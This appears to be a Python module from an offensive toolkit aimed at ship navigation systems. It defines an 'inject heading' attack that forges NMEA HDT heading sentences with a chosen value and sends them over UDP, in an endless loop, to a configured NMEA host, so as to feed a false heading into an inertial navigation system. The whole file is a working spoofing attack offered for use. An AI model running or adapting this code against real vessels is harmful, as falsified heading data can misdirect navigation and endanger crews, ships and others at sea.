import asyncio
import logging
import socket

from attacks import Attack, AttackNumberParameter
from settings import NMEA_HOST, NMEA_PORT, LISTEN_INTERFACE

import pynmea2

class InjectHeadingAttack(Attack):

  def __init__(self):
    super().__init__('inject_heading', 'Inject heading', 'Injects a fictitious heading into the INS', [
      AttackNumberParameter('heading_to_inject', 'Which heading to inject', True, min=0, max=359),
      AttackNumberParameter('injection_hz', 'Frequency of the packets injection', default = 1.0),
    ])

  async def run(self, heading_to_inject: float, injection_hz: float = 1.0):
    loop = asyncio.get_running_loop()
    interval = 1.0 / injection_hz
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) as sock:
      sock.setblocking(False)
      sock.bind((LISTEN_INTERFACE, 0))
      sentence = pynmea2.HDT('HE', 'HDT', [ str(heading_to_inject), 'T' ])
      sentence_bytes = sentence.render(checksum=True, dollar=True, newline=True).encode('ascii')
      while True:
        await loop.sock_sendto(sock, sentence_bytes, (NMEA_HOST.exploded, NMEA_PORT))
        self.logger.debug(sentence_bytes)
        await asyncio.sleep(interval)


async def inject_heading(heading_to_inject: float, injection_hz: float = 1.0):
  logger = logging.getLogger(inject_heading.__name__)
  loop = asyncio.get_running_loop()
  interval = 1.0 / injection_hz
  with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) as sock:
    sock.setblocking(False)
    sock.bind((LISTEN_INTERFACE, 0))
    sentence = pynmea2.HDT('HE', 'HDT', [ str(heading_to_inject), 'T' ])
    sentence_bytes = sentence.render(checksum=True, dollar=True, newline=True).encode('ascii')
    while True:
      await loop.sock_sendto(sock, sentence_bytes, (NMEA_HOST.exploded, NMEA_PORT))
      logger.debug(sentence_bytes)
      await asyncio.sleep(interval)
